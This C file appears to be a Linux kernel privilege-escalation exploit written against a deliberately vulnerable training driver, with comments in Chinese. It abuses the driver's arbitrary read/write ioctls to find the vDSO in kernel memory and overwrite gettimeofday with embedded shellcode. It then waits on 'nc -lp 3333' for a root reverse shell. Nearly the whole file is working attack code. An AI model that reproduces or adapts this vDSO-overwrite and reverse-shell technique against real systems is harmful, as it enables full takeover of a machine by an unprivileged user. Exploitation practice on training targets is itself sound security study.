#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffffffff80000000
#define END_ADDR 0xffffffffffffefff

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}

int check_vdso_shellcode(char *shellcode)
{
	size_t addr=0;
	addr=getauxval(AT_SYSINFO_EHDR);
	printf("[+] vdso: 0x%lx\n");
	if (addr<0)
	{
		puts("[-] Cannnot get VDSO addr\n");
		return 0;
	}
	if (memmem((char *)addr,0x1000, shellcode,strlen(shellcode)))
	{
		return 1;
	}
	return 0;
}

int main()
{
	int fd=-1;
	int result=0;
	struct init_args i_args;
	struct realloc_args rello_args;
	char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";

	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	fd=open(PATH,O_RDWR);
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
    // 构造任意地址读写
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	//爆破VDSO地址
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);
		if (!strcmp("gettimeofday",buf+0x2cd))
		{
			result=addr;
			printf("[+] found vdso 0x%lx\n",result);
			break;
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
	// shellcode写到VDSO,覆盖gettimeofday
	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  $ objdump xxx -T  查看gettimeofday代码偏移

	if (check_vdso_shellcode(shellcode)!=0)
	{
		printf("[+] Shellcode is written into vdso, waiting for reverse shell :\n");
		system("nc -lp 3333");
	}
	else
	{
		puts("[-] There are something wrong!\n");
		exit(-1);
	}
	return 0;
}
/*



*/
